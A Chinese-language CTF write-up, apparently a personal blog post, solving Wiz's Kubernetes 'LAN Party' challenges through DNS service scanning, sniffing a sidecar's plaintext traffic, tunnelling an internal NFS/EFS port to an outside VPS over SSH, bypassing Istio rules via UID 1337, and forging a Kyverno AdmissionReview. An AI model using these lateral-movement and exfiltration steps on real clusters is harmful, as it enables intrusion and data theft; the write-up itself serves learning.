---
title: K8s-Lan-Party
date: 2024-03-19 09:30:00
tags:
  - CTF
  - K8s
  - WP
categories: CTF
thumbnail: https://blog.dvkunion.cn/img/04cd8056eeb94d87ac1a3f13301408ac.png

---

# K8s Lan Party

<!-- split -->
很久没写实际的技术相关的文章了，加上最近忙于工作忙于开源项目忙于生活上的各种琐事，完全抽不出自己的时间来做一些事情。   
但还是硬挤着时间尝试做了一下 wiz 的这一期挑战赛，熬了两晚加上激情 py 之后，总算也是 AK 了，三月终于能水一篇文章了。 QAQ   
WP 整体上我会更偏向于自己做题思考的过程，而不是基础的知识点与考点内容，实际上知识点的讲解我自己的基础也并不是很好，其他的师傅们的
WP 我觉得可能会好的很多。所以我更倾向于讲解一下在做题时自己的一些思考过程，包括试错的过程，把每一个 challenge
当成一个真实的渗透测试来做。
<!-- more -->

## 01.Recon - 侦查

签到题整体的思路还是比较明确连贯的。首先我们看一下题目给了什么：

> You have compromised a Kubernetes pod, and your next objective is to compromise other internal services further.  
> As a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag. We have preloaded your
> machine with dnscan to ease this process for further challenges.  
> All the flags in the challenge follow the same format: wiz_k8s_lan_party{*}.

看不懂没关系，人工智能时代这些都不是问题，简要的让 GPT 翻译一下大意就是，在云环境下，你已经拿到了一个 pod 的 shell
权限。现在要开始横向移动，来获取更多的权限和影响。

同时题目还人性化的提示了使用 DNS 进行扫描，还准备了 DNS
扫描工具以简化上传工具的步骤。除此之外，还放出了两个链接：[Kubernetes DNS](https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue)、[DNScan 源码](https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e)

如果在日常的渗透测试或漏洞挖掘中遇到过集群容器环境，那么很容易在这里联想到，我们拿到了一个 pod
的权限后，与在传统环境下进行渗透时的思路是一致的，当本地的权限已足够高或当前的环境提权无望时，最常见的就是对网络进行探测，从而实现横向的移动扩散。

与主机不同的是，主机的场景下，我们通常是对主机的网卡 C段/B段发起端口扫描或存活探测；而在 k8s 集群环境中，相较于 IP
扫描，有一种更为有效的服务探测方式，便是通过 k8s service dns
来对存活的服务进行探测；其[原理](https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/)是 k8s 在创建
pod 和 service 时，会自动的创建一条内置的 dns
记录，以便运行的容器可以按名称而不是IP查找服务。通常，这个域名的格式为：`<pod-ip>.<namespace>.pod.cluster.local`

在了解了这些基础知识后，回到这一题；明显出题人期望我们通过探测服务，从其他的服务中来获取到这个 flag; 并人性化的提示了我们使用
dnscan 扫描。

但是这个工具我们没用过，直接尝试使用来扫描 `*.cluster.local.svc `报错，怎么办呢？

通常遇到不会用的工具，除了看其源码之外，还可以通过 `-h/--help` 尝试获取帮助，或通过 `man` 手册来查看。

`dnscan -h`

![c1-1](https://blog.dvkunion.cn/img/95ea4bb72cf64e88874d130b9cbb18ab.png)

这里提示我们使用的是一个 CIDR 的 IP 范围，而不是域名；通过源码也可以查看到，实际上做了一个对给出的 IP
段进行 [`net.LookupAddr`](https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e#file-dnscan-go-L19) 的操作

由此我们改变策略：要去扫一个 IP 段，该扫哪个 IP 呢？ 常用的思路有：网卡 IP 所在的网段、网关所在的网段、K8s APIServer 所在的网段等等。

依次的进行尝试，最开始我是指扫了 /24 ， 结果发现效果并不好；返回去读了一遍工具代码后直接上到 /16 暴力的去跑了，最终，我们成功的探测到了一个服务：

![c1-2](https://blog.dvkunion.cn/img/ba9bf32a935044d2a827d5394a0fd904.png)

那么对这个服务，最常见的，我们尝试 curl 进行访问：

`curl getflag-service.k8s-lan-party.svc.cluster.local`

即可得到 flag

> 总结：本题主要考察了在日常的渗透中，如何进行横向移动的 dns 扫描操作。

## 02.Finding Neighbours - 找到邻居

依旧还是先读题：

> Sometimes, it seems we are the only ones around, but we should always be on guard against invisible sidecars reporting
> sensitive secrets.

部署过一些 k8s 服务的同学，可能会对这个 `sidecars` 比较敏感，如果对这个不熟悉，我们依旧可以从描述中找出自己最不熟悉、最像专属名词的词语丢个
GPT 来给我们解释：

![c2-1](https://blog.dvkunion.cn/img/a9f207c877944c49a1965a5159dd0daa.png)

GTP 给出了一个很关键的核心：共享网络。而我们此次的挑战赛正是与网络相关，是否这就是这道题的考点呢？

回到环境中来，首先是日常容器中的 3W 原则：我是谁(whoami)，我在哪(where am i)、我有什么权限(what privileged i have)

```shell
ps -ef
cat /proc/1/cgroup
cat /proc/1/status
```

由此基本可以判断出，我们是在一个 pod 内、仅仅包含了网络权限的普通账户，并且该环境下并没有什么值得关注的进程信息。

我们再次读取题干，很大概率可以猜测，这题是让我们找到对应的 sidecar，然后在 sidecar 中发现我们的 flag。那么就回到第一题的网络原则：

网卡 IP 所在的网段、网关所在的网段、K8s APIServer 所在的网段开扫：
最终还是暴力出奇迹，发现了名为：`reporting-service.k8s-lan-party.svc.cluster.local`的服务。

![c2-2](https://blog.dvkunion.cn/img/cbe3b5fc502a421f9c0db3dd015d51dd.png)

但是我们的请求发现，对方并没有如愿的把 flag 直接返回给我；经过不断的尝试，这个服务不论什么请求都是没有任何回应的 200。

怎么办呢？我们重换策略；重新刷新后进入新的题目环境，直接观察对应的网络环境：

`watch netstat -natpul`

![c2-3](https://blog.dvkunion.cn/img/456397740b874588a8537085955b41d9.png)

我们发现，这个 pod 会不断的向一个 IP 发起 TCP 请求；而这个 IP 刚好就是我们刚刚发现的 IP。

这种巧合，很难不让人去猜测他到底在做什么？于是我们尝试对这个请求进行抓包：

`tcpdump host 10.100.171.123 -w 1.pcap`

![c2-4](https://blog.dvkunion.cn/img/63e734f6e0f44cd7a33388bd9afeab5f.png)

等待几秒后，我们直接从流量包中获取到了明文的 flag 信息。

> 总结：在第一题的基础上，考察了对网络的敏感性与抓包的基本功；  
> 除此之外，这题还给了我们一个很大的警示：HTTP 服务会暴露明文传输的敏感信息

## 03.DATA LEAKAGE

这题我整体的思路完全炸了，导致卡了一整天，最后还是 PY 了一下思路才转过头来...只能说有的时候想的太多，并不是什么好事。

首先题干中比较明确的指出了：网络存储。

那么我们首先查看一下当前环境，发现了一个 efs，并且在 efs 下，存在我们目标的 flag 文件。

`cat /proc/1/mountinfo`

![c3-1](https://blog.dvkunion.cn/3cb3e854a44447649a917f7dc7b0b161.png)

说到网络存储，如果你是一个主机玩家，那么对 nas 一定不陌生。 在 nas 配置的时候，也会常常遇到一个问题：nas 是基于 unix 实现的文件
acl 权限管控，也就是说，文件的权限校验只与 uid/gid 有关。

结合[efs的官方提示](https://docs.aws.amazon.com/zh_cn/efs/latest/ug/accessing-fs-nfs-permissions.html)：

![c3-2](https://blog.dvkunion.cn/img/6dadd77fbe2948d3ba9747dffa2cb5d7.png)

我们可知，在通过 nfs 挂载 efs 的时候，efs 自身的校验不会生效，而是完全信任客户端的权限校验，也就是 nfs 的认证。

所以，只要我们能保证自己的 uid/gid 为 1，即可查看这个文件。

所以，我的想法是，通过 usernamespace 创建一个假的命名环境空间，让 uid/gid=1.

然后这题就做不动了。。。尝试各种办法伪造 uid(unshare 没有
uid_map的写权限、尝试修改默认的内核参数/proc/sys/kernel/overflowuid等等)

基本没有作用，因为题目的权限只有 caps_net_admin / caps_net_raw... 只有网络操作相关的权限。

由此重新挂载来实现这个目录的权限变更也不现实，`mount` 需要更高的权限。

可是如何能通过网络来实现将自身 uid/gid 的修改呢？难道我们要解析捕获 nfs 的协议然后修改包吗？

在尝试写了大量的抓包、改包、以及解决上传过大文件导致断流 limit 的问题等，我觉得这个题目的思考点肯定是错了。

本着节约时间的思想，PY 了一下hint (by [@Esonhugh](https://github.com/Esonhugh)), 原来：

> "棋盘内的胜负有时候是在棋盘外"

![c3-3](https://blog.dvkunion.cn/img/0386daa74c7f4f16a7581760befedef2.png)

既然容器内权限不够、无法挂载，那么只要我在容器外是不是就有权限挂载、有权限以更高的unix 账户来访问文件？

由此，整个问题就变成了：如何在外部访问到这个容器内理应才能够访问到的域名？

答案自然是：流量转发。

这里就不再多赘述如何实现流量转发的问题了，只需要把服务通过隧道转发到外部的 vps 中即可。

这里使用最简单的 ssh 隧道转发:

`ssh -L 2049:192.168.124.98:2049 -o StrictHostKeyChecking=no -N root@<vps_ip>`

192.168.124.98 是通过 mountinfo 查看到的(cat /proc/1/mountinfo); 2049 是 nfs 服务默认端口。

这样，我们在自己的 vps 上执行 mount 动作，即可成功以 root 账户挂载一个新的 efs 目录，然后成功获取到 flag。

## 04.ByPassing Boundaries - 绕过边界

这题由于我非预期了。。。就没怎么看，所以预期解没什么思考的部分，也没花什么时间去研究，正解纯粹 PY 来的(
by [@Esonhugh](https://github.com/Esonhugh))

[hint](https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables) 提示到，让我们观察
istio 的 iptables 规则：

我们可以注意到一个有趣的声明：

![c4-1](https://blog.dvkunion.cn/img/f9b5bad4292b41b5a3984eba2ccdae46.png)

同时官方的[ISSUE](https://github.com/istio/istio/issues/4286) 中也提到了这一个。

并且在这个题目中，我们是一个 root 账号，在确认权限后，具有 caps_setuid 和 caps_setgid 的能力。

那么依旧首先探测网络，捕捉到一个 `istio-protected-pod-service.k8s-lan-party.svc.cluster.local` 服务，但是直接请求会发现：

![c4-2](https://blog.dvkunion.cn/img/01965762d9cb41d0934e189bea8a80e9.png)

让我们切换到神奇的 1337 uid中：

`su istio`

![c4-3](https://blog.dvkunion.cn/img/780820915be046468ccdb2ae39516383.png)

再次请求，我们发现，原本不通的网络已经通了。

结合文档，可知：在 istio 中 ，1337 用户的流量不会过到 envoy 中，从而可以绕过防火墙策略；由此，在 istio 环境下的 pod 内使用
root 权限来运行容器是十分危险的。

## 04-ex.ByPassing Boundaries 的非预期

非预期讲起来也好笑，在发现网络不通后，没有读hint，也没什么思路，就去做第五题了。

结果实际上，在第五题的网络中，这个请求是直接通的。。。你可以直接在题5的终端中执行：

`curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local`

怀疑是策略没有设置。。。或是其他原因，官方发送的邮件也米有回应。。。

## 05.Lateral Movement - 横向移动

这题我完全没有考虑出有什么考点，就是根据提示以学习的思路去做硬拼出来的，感觉整体上这题与前四题有些脱节。

首先是题到的一个新资源：`kyverno.io/v1.Policy`，初步搜索一下，即可找到 kyverno 这个项目。

然后依旧是题 1 的网络探测，可以发现如下服务：

```shell
10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
```

再看给出的 policy 的描述：这是一个 `mutate` 规则，在 kyverno 的仓库中尝试搜索：`/mutate`, 找到了对应服务的路由。

如果你没有看出需要查找 `mutate` 的路由这一步，实际上，通过 `metrics` 也能看到其他大佬的请求日志，找到数量非1次的那种评估一下，大概率就是答案的路由, 这也是常见的 metrics 信息泄漏的问题。

`curl kyverno-svc-metrics.kyverno.svc.cluster.local:8000/metrics`

在获取到路由后，我们可以知道，这是一个 POST 请求，当我们构造的 `AdmissionReview` 符合其规则 `apply-flag-to-env` 时，服务会把flag 通过 env 塞到我们的请求结构中。

最终这道题就转化为了，如何构造一个 AdmissionReview 的 json，来获取这个 env。

如果你对 k8s admission webhook 熟悉的话，可以快速的构造出一个：admission.k8s.io/v1beta1 的结构；也可以通过go导入对应的struct来快速反序列化一个json。

最终只要满足： namespace 为 sensitive-ns、kind 为 POD、动作为 CREATE/UPDATE 、不能让服务产生空指针问题(坑，kyverno在取值时很多字段容易出现空指针，必须要为其提供对应的字段，否则会出现 curl: (92) HTTP/2 stream 0 was not closed cleanly: INTERNAL_ERROR (err 2) )

所以这题就是一个按照手册 拼请求的一道题。。。完全没有需要深究为什么的思路了。。。

## 结尾语

总体来说，这一次挑战的题目，除了最后一题之外，个人感觉还是很有趣的，对整体的思维、实战理解、以及一些常用基本功如抓包、转发等等，都有涉及。

涉及到的知识点也比较有趣，基本文献都是国外才能看得到的，在国内没有对这些 feature 进行利用的文章。

只能说，革命尚未成功，云安全的同志们仍需要继续一起努力！

![cert](https://blog.dvkunion.cn/img/e23d2f457cde4fa5a52e379454f8e967.png)

